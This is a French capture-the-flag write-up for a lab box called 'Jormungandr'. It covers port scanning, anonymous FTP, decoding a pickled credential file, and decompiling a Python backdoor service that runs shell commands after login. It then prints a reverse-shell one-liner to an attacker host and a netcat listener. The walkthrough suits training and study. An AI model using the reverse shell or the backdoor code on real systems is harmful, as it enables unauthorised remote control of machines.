# Jormungandr

## Contexte
- **Nom du challenge** : Jormungandr
- **Catégorie** : Reverse
- **Difficulté** : Medium
- **Cible** : `10.10.0.6` (puis `10.10.0.5`, `10.10.0.34` après redéploiement)
- **Objectif** : obtenir un accès sur la machine et lire `user.txt`.

---

## 1. Reconnaissance

Scan complet des ports avec détection de services :

```bash
nmap -sV -sC -p- <IP>
```

Résultat :

```
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             124 Jul 23 13:42 poem.txt
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
```

Deux services ressortent :
- **FTP (21)** : connexion **anonyme autorisée** → accès sans identifiants.
- **SSH (22)** : point d'entrée potentiel une fois des identifiants trouvés.

---

## 2. Accès FTP anonyme

Connexion au FTP avec l'utilisateur `anonymous` (aucun mot de passe requis) :

```bash
ftp <IP>
# user : anonymous
# password : (vide)
```

J'affiche **tous** les fichiers, y compris les cachés :

```bash
ls -la
```

```
-rw-r--r--    1 0        0            5409 Jul 23 13:42 .yggdrasil.cache
-rw-r--r--    1 0        0             124 Jul 23 13:42 poem.txt
```

Un fichier caché `.yggdrasil.cache` attire l'attention. Je le récupère :

```bash
get .yggdrasil.cache
get poem.txt
```

---

## 3. Décodage de `.yggdrasil.cache`

Le fichier contient une longue chaîne de `0` et de `1`. Découpée en tranches de **8 bits**
et convertie en octets, elle révèle un objet **pickle Python** que l'on charge :

```python
import pickle

# bits -> octets
bits = open(".yggdrasil.cache").read().strip()
data = bytes(int(bits[i:i+8], 2) for i in range(0, len(bits), 8))

obj = pickle.loads(data)
print(obj)
```

La conversion des bits en octets donne la séquence suivante — un flux **pickle** (il commence
par `\x80\x04\x95`, signature du protocole 4) :

```
b'\x80\x04\x95\x99\x02\x00\x00\x00\x00\x00\x00]\x94(\x8c\tssh_pass0\x94\x8c\x01I\x94\x86\x94
\x8c\nssh_pass21\x94\x8c\x01n\x94\x86\x94\x8c\tssh_user0\x94\x8c\x01f\x94\x86\x94\x8c\tssh_pass1
\x94\x8c\x01_\x94\x86\x94\x8c\nssh_pass26\x94\x8c\x01g\x94\x86\x94\x8c\nssh_pass11\x94h\x0b\x86
\x94\x8c\nssh_pass12\x94\x8c\x01o\x94\x86\x94\x8c\nssh_pass23\x94h\x0b\x86\x94\x8c\nssh_pass15
\x94h\x05\x86\x94\x8c\tssh_pass2\x94\x8c\x01w\x94\x86\x94\x8c\tssh_pass3\x94\x8c\x01i\x94\x86\x94
\x8c\tssh_pass6\x94h\x0b\x86\x94\x8c\nssh_pass17\x94\x8c\x01d\x94\x86\x94\x8c\nssh_pass19\x94
\x8c\x01r\x94\x86\x94\x8c\nssh_pass16\x94h\x0b\x86\x94\x8c\nssh_pass10\x94\x8c\x01l\x94\x86\x94
\x8c\nssh_pass13\x94h"\x86\x94\x8c\nssh_pass18\x94\x8c\x01u\x94\x86\x94\x8c\nssh_pass22\x94h\x0e
\x86\x94\x8c\nssh_pass25\x94\x8c\x01a\x94\x86\x94\x8c\tssh_pass8\x94h\x1d\x86\x94\x8c\nssh_pass27
\x94h\x05\x86\x94\x8c\nssh_pass24\x94h%\x86\x94\x8c\tssh_user3\x94h%\x86\x94\x8c\tssh_pass5\x94
h*\x86\x94\x8c\nssh_pass31\x94\x8c\x01k\x94\x86\x94\x8c\tssh_user5\x94h%\x86\x94\x8c\tssh_user2
\x94h\x05\x86\x94\x8c\tssh_user1\x94\x8c\x01e\x94\x86\x94\x8c\tssh_user4\x94h\x1d\x86\x94\x8c
\nssh_pass29\x94h%\x86\x94\x8c\tssh_pass7\x94hA\x86\x94\x8c\tssh_pass4\x94h*\x86\x94\x8c
\nssh_pass20\x94h\x1d\x86\x94\x8c\tssh_pass9\x94h*\x86\x94\x8c\nssh_pass14\x94h\x1d\x86\x94\x8c
\nssh_pass28\x94h4\x86\x94\x8c\nssh_pass30\x94h\x13\x86\x94e.'
```

Une fois chargé avec `pickle.loads()`, l'objet est une liste de tuples : chaque identifiant
est **stocké caractère par caractère**, avec un index dans le nom de la clé :

```
[('ssh_pass0', 'I'), ('ssh_pass21', 'n'), ('ssh_user0', 'f'), ('ssh_pass1', '_'),
 ('ssh_pass26', 'g'), ('ssh_pass11', '_'), ('ssh_pass12', 'o'), ('ssh_pass23', '_'),
 ('ssh_pass15', 'n'), ('ssh_pass2', 'w'), ('ssh_pass3', 'i'), ('ssh_pass6', '_'),
 ('ssh_pass17', 'd'), ('ssh_pass19', 'r'), ('ssh_pass16', '_'), ('ssh_pass10', 'l'),
 ('ssh_pass13', 'd'), ('ssh_pass18', 'u'), ('ssh_pass22', 'g'), ('ssh_pass25', 'a'),
 ('ssh_pass8', 'i'), ('ssh_pass27', 'n'), ('ssh_pass24', 'r'), ('ssh_user3', 'r'),
 ('ssh_pass5', 'l'), ('ssh_pass31', 'k'), ('ssh_user5', 'r'), ('ssh_user2', 'n'),
 ('ssh_user1', 'e'), ('ssh_user4', 'i'), ('ssh_pass29', 'r'), ('ssh_pass7', 'k'),
 ('ssh_pass4', 'l'), ('ssh_pass20', 'i'), ('ssh_pass9', 'l'), ('ssh_pass14', 'i'),
 ('ssh_pass28', 'a'), ('ssh_pass30', 'o')]
```

Après la reconstitution, cela donne les identifiants :

```
user     : fenrir
password : I_will_kill_odin_during_ragnarok
```

---

## 4. Connexion SSH (fenrir)

Avec ces identifiants, connexion en SSH sur la machine cible :

```bash
ssh fenrir@<IP>
# password : I_will_kill_odin_during_ragnarok
```

---

## 5. Reverse de `mjollnir.pyc`

Sur la machine, on trouve un fichier `mjollnir.pyc`. Je le transfère sur ma machine locale
avec `scp`, puis je le décompile :

```bash
scp fenrir@<IP>:mjollnir.pyc .
decompyle3 mjollnir.pyc
```

Le code source décompilé :

```python
from Crypto.Util.number import bytes_to_long, long_to_bytes
import sys, textwrap, socketserver, string, readline, threading
from time import *
import getpass, os, subprocess
username = long_to_bytes(128672430374905338731062386L)
password = long_to_bytes(33643248411776211125062560554130339746417025421355137140099645078910060553582L)

class Service(socketserver.BaseRequestHandler):

    def ask_creds(self):
        username_input = self.receive(b'Username: ').strip()
        password_input = self.receive(b'Password: ').strip()
        print(username_input, password_input)
        if username_input == username:
            if password_input == password:
                return True
            return False

    def handle(self):
        loggedin = self.ask_creds()
        if not loggedin:
            self.send(b'Wrong credentials!')
            return
        self.send(b'Successfully logged in!')
        while True:
            command = self.receive(b'C:\\User\\Jormungandr> ')
            p = subprocess.Popen(command,
              shell=True, stdout=(subprocess.PIPE), stderr=(subprocess.PIPE))
            self.send(p.stdout.read())

    def send(self, string, newline=True):
        if newline:
            string = string + b'\n'
        self.request.sendall(string)

    def receive(self, prompt=b'> '):
        self.send(prompt, newline=False)
        return self.request.recv(4096).strip()


class ThreadedService(socketserver.ThreadingMixIn, socketserver.TCPServer, socketserver.DatagramRequestHandler):
    pass


def main():
    print("Starting server...")
    port = 7432
    host = "0.0.0.0"
    service = Service
    server = ThreadedService((host, port), service)
    server.allow_reuse_address = True
    server_thread = threading.Thread(target=(server.serve_forever))
    server_thread.daemon = True
    server_thread.start()
    print("Server started on " + str(server.server_address) + "!")
    while True:
        sleep(10)


if __name__ == "__main__":
    main()
```

Il s'agit d'un **serveur Python** écoutant sur le port **7432**, qui :
- demande un couple username/password décodés avec
  `long_to_bytes()` ;
- une fois authentifié, exécute **n'importe quelle commande shell** envoyée.

En décodant les deux entiers du code avec `long_to_bytes()`, on obtient les
**identifiants** attendus par le service :

```python
from Crypto.Util.number import long_to_bytes
print(long_to_bytes(128672430374905338731062386))
print(long_to_bytes(33643248411776211125062560554130339746417025421355137140099645078910060553582))
```

```
user     : jormungandr
password : Jag_ar_Jormungandr_midgardsormen
```

---

## 6. Exploitation du service port 7432 → reverse shell

Le service sur le port 7432 est un **protocole texte maison** (pas du SSH), on s'y connecte
donc en brut avec `netcat` :

```bash
nc <IP> 7432
```


On s'authentifie en tant que `jormungandr`, puis on envoie une commande reverse shell :

```bash
bash -c 'bash -i >& /dev/tcp/<Mon_IP>/4444 0>&1'
```

(avec un listener `nc -lvnp 4444` côté attaquant)

→ **shell interactif obtenu en tant que `jormungandr`**, puis lecture du flag :

```bash
cat user.txt
```

→ **flag `user.txt` obtenu**.

---

## Outils utilisés
- `nmap` — scan des ports et détection de services
- `ftp` — connexion au serveur FTP anonyme
- `ssh` / `scp` — accès distant et transfert de fichiers
- `python` (`pickle`, `pickletools`, `long_to_bytes`) — décodage et analyse des données
- `decompyle3` — décompilation de bytecode Python
- `nc` (netcat) — connexion au listener de reverse shell

## Techniques utilisées
- **Énumération** de ports et services (nmap)
- Exploitation d'une **mauvaise configuration FTP** (login anonyme)
- **Décodage multi-format** (binaire → octets → pickle, entiers → bytes)
- **Reverse engineering** de bytecode Python (`.pyc`)
